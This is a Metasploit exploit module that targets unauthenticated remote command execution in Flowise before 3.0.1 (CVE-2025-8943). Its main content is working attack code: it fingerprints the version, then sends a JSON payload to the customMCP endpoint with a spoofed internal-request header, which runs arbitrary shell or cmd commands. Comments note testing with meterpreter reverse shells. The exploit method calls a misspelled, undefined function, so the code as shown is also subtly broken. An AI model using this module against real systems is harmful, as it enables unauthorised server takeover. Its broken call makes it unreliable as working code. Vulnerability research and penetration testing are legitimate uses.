##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Flowise Custom MCP Remote Command Execution)',
        'Description' => %q{
          This module exploits an unauthenticated remote command execution vulnerability
          in Flowise versions < 3.0.1. The vulnerability exists in the customMCP endpoint
          (/api/v1/node-load-method/customMCP) which allows unauthenticated users to execute
          arbitrary commands by sending a specially crafted JSON payload.
          The endpoint accepts a command and arguments that are executed directly on the system.
        },
        'Author' => [
          'Assaf Levkovich', # Vulnerability discovery (JFrog)
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-8943'],
          ['URL', 'https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/']
        ],
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter_reverse_tcp
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter_reverse_tcp
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-08-14',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 3000,
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def check
    version_url = normalize_uri(target_uri.path, 'api', 'v1', 'version')
    res = send_request_cgi({
      'uri' => version_url,
      'method' => 'GET',
      'headers' => { 'Accept' => 'application/json' }
    })

    return CheckCode::Unknown('Could not retrieve Flowise version') unless res&.code == 200

    json_data = res.get_json_document
    version_str = json_data['version']
    return CheckCode::Detected('Could not retrieve Flowise version') if version_str.blank?

    version = Rex::Version.new(version_str)
    print_status("Flowise version detected: #{version}")

    return CheckCode::Appears("Version #{version} is vulnerable to CVE-2025-8943") if version < Rex::Version.new('3.0.1')

    CheckCode::Safe("Version #{version} is not vulnerable")
  end

  def execute_command(cmd, _opts = {})
    command = 'sh'
    args = ['-c', cmd]

    if target.platform.names.include?('Windows')
      command = 'cmd'
      args = ['/c', cmd]
    end

    payload = {
      'inputs' => {
        'mcpServerConfig' => {
          'command' => command,
          'args' => args
        }
      },
      'loadMethod' => 'listActions'
    }

    exploit_url = normalize_uri(target_uri.path, 'api', 'v1', 'node-load-method', 'customMCP')
    res = send_request_cgi({
      'uri' => exploit_url,
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'x-request-from' => 'internal'
      },
      'data' => payload.to_json
    })

    return false unless res

    true
  end

  def exploit
    fail_with(Failure::PayloadFailed, 'Failed to run payload') unless execute_comamnd(payload.encoded)
  end
end
